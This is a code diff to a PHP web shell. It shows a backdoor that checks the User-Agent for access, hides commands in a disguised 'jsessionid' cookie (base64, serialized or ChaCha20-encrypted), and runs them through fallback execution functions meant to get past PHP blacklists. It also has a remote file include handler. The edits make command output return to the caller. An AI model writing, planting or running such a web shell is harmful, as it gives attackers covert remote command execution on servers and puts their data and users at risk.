@@ -1,5 +1,5 @@
 <?php
-//LEAVE ME HERE!!!!!!!!!!!!!
+//LEAVE ME HERE!!!!!!!!!!!!!!!!!!!!!!!!!!
 
 error_reporting(E_ERROR | E_PARSE);
 if ( ! defined( "PATH_SEPARATOR" ) ) {
@@ -254,31 +254,27 @@ function executeCommands(string $command)
     # Try to find a way to run our command using various PHP internals
     if (function_exists('call_user_func_array')) {
         # http://php.net/manual/en/function.call-user-func-array.php
-        call_user_func_array('system', array($command));
+        return call_user_func_array('system', array($command));
     } elseif (function_exists('call_user_func')) {
         # http://php.net/manual/en/function.call-user-func.php
-        call_user_func('system', $command);
+        return call_user_func('system', $command);
     } else if (function_exists('passthru')) {
         # https://www.php.net/manual/en/function.passthru.php
         ob_start();
         passthru($command, $return_var);
-        echo ob_get_contents();
         ob_end_clean();
+        return $return_var;
     } else if (function_exists('system')) {
         # this is the last resort. chances are PHP Suhosin
         # has system() on a blacklist anyways :>
         # http://php.net/manual/en/function.system.php
-        foreach (explode("\n", system($command)) as $ava) {
-            echo $ava . "<br>";
-        }
+        return system($command);
     } else if (class_exists('ReflectionFunction')) {
         # http://php.net/manual/en/class.reflectionfunction.php
         $function = new ReflectionFunction('system');
-        $a = $function->invoke($command);
-        foreach (explode("\n", $a) as $v) {
-            echo trim($v) . "<br>";
-        }
+        return $function->invoke($command);
     }
+    return "";
 }
 
 $ns = null;
@@ -293,15 +289,15 @@ if (validate_auth($_SERVER['HTTP_USER_AGENT'])) {
         if (isset($_POST["cr"])) {
             if ($_POST['cr'] === "1") {
                 $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes" => false]));
-                executeCommands($split);
+                print_r(executeCommands($split));
             } elseif ($_POST['cr'] === '1b') {
                 $split = base64_decode($_COOKIE['jsessionid']);
-                executeCommands($split, '1');
+                print_r(executeCommands($split, '1'));
             } else {
                 $s = $_COOKIE['jsessionid'];
                 $v = explode(".", base64_decode($s));
                 $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
-                executeCommands(base64_decode($split));
+                print_r(executeCommands(base64_decode($split)));
             }
         } elseif (isset($_POST["doInclude"])) {
             remoteFileInclude($_POST["doInclude"]);
